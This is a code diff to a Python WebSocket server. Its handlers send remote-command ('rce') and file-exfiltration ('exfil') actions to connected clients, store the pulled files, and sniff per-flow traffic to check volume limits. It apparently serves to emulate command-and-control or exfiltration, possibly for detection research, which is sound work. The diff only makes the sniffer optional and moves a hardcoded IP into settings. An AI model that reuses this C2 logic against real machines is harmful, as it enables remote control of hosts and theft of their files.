@@ -71,7 +71,7 @@ class Sniffer:
                 self.flows[(dst_ip, dst_port, src_ip, src_port)]["dst2src_max_ps"] = max(self.flows[(dst_ip, dst_port, src_ip, src_port)]["dst2src_max_ps"], packet_size)
             else:
                 self.flows[(src_ip, src_port, dst_ip, dst_port)] = {'src2dst_packets': 1, "src2dst_bytes": packet_size, "src2dst_max_ps": packet_size, 'dst2src_packets': 0, "dst2src_bytes": 0, "dst2src_max_ps": 0}  
-            
+
     def run_sniffing(self):
         """Start sniffing packets in a separate thread."""
         filter_rule = f"{self.conf['protocol']} and host {self.conf['ip']} and port {self.conf['port']}"
@@ -107,9 +107,12 @@ class WebSocketServer:
         self.check_termination_condition= check_termination_condition
         self.iface_name = iface_name  # Network interface name
         self.clients = {}  # Stores client stats
-        self.sniffer = Sniffer(self,interface=self.iface_name,ip=ip ,port=port)  # Attach the Sniffer class
-        self.loop = asyncio.get_event_loop()
-        self.sniffer.start()
+        self.port = port
+        self.ip = ip 
+        if self.check_termination_condition:
+            self.sniffer = Sniffer(self,interface=self.iface_name,ip=self.ip ,port=self.port)  # Attach the Sniffer class
+            self.loop = asyncio.get_event_loop()
+            self.sniffer.start()
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         #set relative path
         self.parent_folder  = Path(__file__).resolve().parent.parent
@@ -127,11 +130,11 @@ class WebSocketServer:
              )
     async def exfil(self, websocket, client_id, key , value):
         await websocket.send(json.dumps({key:value}))
-        with self.sniffer.lock:  
-             sniffed_stats = self.sniffer.flows.get(client_id, {}).copy()  
-
-        # Merge sniffer statistics into self.clients before logging
-        self.clients[client_id].update(sniffed_stats)
+        if self.check_termination_condition:
+            with self.sniffer.lock:  
+                sniffed_stats = self.sniffer.flows.get(client_id, {}).copy()  
+            # Merge sniffer statistics into self.clients before logging
+            self.clients[client_id].update(sniffed_stats)
         logging.info(f"Sent Exfil action  {key}: {value} to be  executed on client: {client_id}")
         file_name = os.path.basename(value)
         store_exfiled_files = f"{self.parent_folder}/exfiled_data/{client_id}-{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}_{file_name}"
@@ -151,11 +154,11 @@ class WebSocketServer:
     async def rce(self, websocket, client_id, key, value):
         # Send command to client
         await websocket.send(json.dumps({key:value}))
-        with self.sniffer.lock:  
-             sniffed_stats = self.sniffer.flows.get(client_id, {}).copy()  
-
-        # Merge sniffer statistics into self.clients before logging
-        self.clients[client_id].update(sniffed_stats)
+        if self.check_termination_condition:
+            with self.sniffer.lock:  
+                sniffed_stats = self.sniffer.flows.get(client_id, {}).copy()  
+            # Merge sniffer statistics into self.clients before logging
+            self.clients[client_id].update(sniffed_stats)
         logging.info(f"Sent RCE action {key}: {value} to be  executed on client: {client_id}")
 
         # Receive execution result
@@ -168,7 +171,7 @@ class WebSocketServer:
         """Generate a unique client identifier using IP and source port."""
         peername = websocket.remote_address
         if peername:
-            return (peername[0], peername[1], "10.11.54.137", 5000)
+            return (peername[0], peername[1], self.ip, self.port)
             #return f"{peername[0]}:{peername[1]}"
         return "unknown_client"
     def generate_random_string(self,size:int):
@@ -284,10 +287,9 @@ class WebSocketServer:
             print(f"❌ No recorded packets for {client_id}. Available flows: {list(stats_snapshot.keys())}")
             return False  
 
-        conditions = self.config["termination_conditions"]
+        #conditions = self.config["termination_conditions"]
+        conditions = self.config["underlay_limit"]
         stats = stats_snapshot.get(client_id, {})
-        print("============================", self.config["underlay_limit"])
-        print(f"🔍 Checking termination for {client_id}: {stats}")  # Debugging
         for condition in conditions:
             stat_value = stats.get(condition, 0)
             limit_value = self.config["underlay_limit"].get(condition, float("inf"))
@@ -309,8 +311,11 @@ class WebSocketServer:
 
 
 async def main():
-    ip, port, iface_name = resolve_settings() # ip, port, iface_name (interface name) = resolve_settings(
-    server = WebSocketServer(check_termination_condition=True , iface_name=iface_name, ip=ip,port=port) 
+    ip, port, iface_name , check_termination_condition= resolve_settings() # ip, port, iface_name (interface name) = resolve_settings(
+    server = WebSocketServer(check_termination_condition=check_termination_condition , 
+                             iface_name=iface_name, 
+                             ip=ip,
+                             port=port) 
     await server.start(ip, port)
 if __name__ == "__main__":
     asyncio.run(main())
